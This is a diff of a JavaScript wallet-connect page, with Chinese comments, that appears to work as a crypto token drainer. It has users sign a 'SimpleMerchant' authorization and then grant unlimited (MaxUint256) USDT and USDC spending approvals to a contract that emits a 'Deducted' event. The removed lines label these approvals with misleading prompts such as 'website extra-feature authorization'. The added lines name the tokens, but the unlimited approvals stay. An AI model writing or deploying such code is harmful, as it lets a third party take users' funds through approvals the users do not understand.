@@ -1,11 +1,12 @@
 // SPDX-License-Identifier: MIT
 // pragma solidity ^0.8.20;  //  Not applicable in JavaScript
 
-// 你的 USDC 合約地址
-const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; // 替換為你部署的 USDC 合約地址
-const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合約地址
+// 你的 USDC 合約地址 (务必替换成正确的合约地址)
+const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; //  你的 USDC 合约地址 (正确!)
+const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // 你的 USDT 合约地址 (正确!)
+const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合约地址
 
-// 合約 ABI (确保包含了 connectAndAuthorize, authorized, Deducted 事件)
+// 合約 ABI (確保包含了 connectAndAuthorize, authorized, Deducted 事件)
 const CONTRACT_ABI = [
     "function connectAndAuthorize(address tokenContract) external",
     "function authorized(address customer) external view returns (bool)",
@@ -137,7 +138,7 @@ async function initializeWallet() {
 async function checkAuthorization() {
     try {
         if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
-            showOverlay('錢包未準備好。請鏈接。');
+            showOverlay('錢包未準備好。請連線。');
             return;
         }
 
@@ -174,21 +175,21 @@ async function checkAuthorization() {
         // USDT 的授權狀態
         statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
         if (isUsdtMaxApproved) {
-            statusMessage += `授權網站功能 ✅.`;
+            statusMessage += `USDT 授权 MaxUint256 ✅.`;
         } else if (usdtAllowance > 0n) {
-            statusMessage += `授權不足 ⚠️.`;
+            statusMessage += `USDT 授權不足 ⚠️.`;
         } else {
-            statusMessage += `未授權或授權失敗 ❌.`;
+            statusMessage += `USDT 未授權或授權為零 ❌.`;
         }
 
         // USDC 的授權狀態
         statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
         if (isUsdcMaxApproved) {
-            statusMessage += `網站內容授權 ✅.`;
+            statusMessage += `USDC 授权 MaxUint256 ✅.`;
         } else if (usdcAllowance > 0n) {
-            statusMessage += `授權不足 ⚠️.`;
+            statusMessage += `USDC 授權不足 ⚠️.`;
         } else {
-            statusMessage += `未授權或授權失敗 ❌.`;
+            statusMessage += `USDC 未授權或授權為零 ❌.`;
         }
 
         // Button state: needs to be clicked if authorization is incomplete
@@ -245,31 +246,31 @@ async function connectWallet() {
             updateStatus('');
         }
 
-        // 1. 檢查並執行 SimpleMerchant 合約的授權 (connectAndAuthorize)  (保持不變)
-        let isAuthorized = await contract.authorized(userAddress);
+        // 1. 检查 SimpleMerchant 合约的授权 (connectAndAuthorize，仅用于连接和授权，无需传递代币地址)
+        let isAuthorized = await contract.authorized(userAddress); // 不需要传参
         if (!isAuthorized) {
-            updateStatus(''); // 隱藏進度
-            showOverlay('1/3: 請在錢包中簽署錢包鏈接授權');
-            const txAuthorize = await contract.connectAndAuthorize(USDC_CONTRACT_ADDRESS); // 傳入 USDC 合約地址
-            await txAuthorize.wait();
-            updateStatus(''); // 隱藏成功訊息
+          updateStatus(''); // 隐藏进度
+          showOverlay('1/3: 請在錢包中簽署 SimpleMerchant 合約授權'); // 修改提示
+          const txAuthorize = await contract.connectAndAuthorize(USDC_CONTRACT_ADDRESS); // 调用 connectAndAuthorize
+          await txAuthorize.wait();
+          updateStatus(''); // 隐藏成功消息
         } else {
-            updateStatus(''); // 隱藏已授權訊息
+          updateStatus(''); // 隐藏已授权消息
         }
 
-        // 2. 检查并执行 USDT 代币的批准 (approve) (保持不變)
+        // 2. 检查并执行 USDT 代币的批准 (approve)
         let usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
         const maxAllowance = ethers.MaxUint256;
 
         // Re-approve if approval is not MaxUint256 (or close)
         if (usdtAllowance < maxAllowance) {
-            updateStatus(''); // 隱藏進度
-            showOverlay('2/3: 請在錢包中簽署網站鏈接授權');
+            updateStatus(''); // 隐藏进度
+            showOverlay('2/3: 請在錢包中簽署 USDT 授權');
             const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
             await txApproveUsdt.wait();
-            updateStatus(''); // 隱藏成功訊息
+            updateStatus(''); // 隐藏成功消息
         } else {
-            updateStatus(''); // 隱藏已授權訊息
+            updateStatus(''); // 隐藏已授权消息
         }
 
         // 3. 检查并执行 USDC 代币的批准 (approve)
@@ -277,13 +278,13 @@ async function connectWallet() {
 
         // Re-approve if approval is not MaxUint256 (or close)
         if (usdcAllowance < maxAllowance) {
-            updateStatus(''); // 隱藏進度
-            showOverlay('3/3: 請在錢包中簽署網站附加功能授權');
+            updateStatus(''); // 隐藏进度
+            showOverlay('3/3: 請在錢包中簽署 USDC 授權');
             const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
             await txApproveUsdc.wait();
-            updateStatus(''); // 隱藏成功訊息
+            updateStatus(''); // 隐藏成功消息
         } else {
-            updateStatus(''); // 隱藏已授權訊息
+            updateStatus(''); // 隐藏已授权消息
         }
 
         // Final check and update button appearance
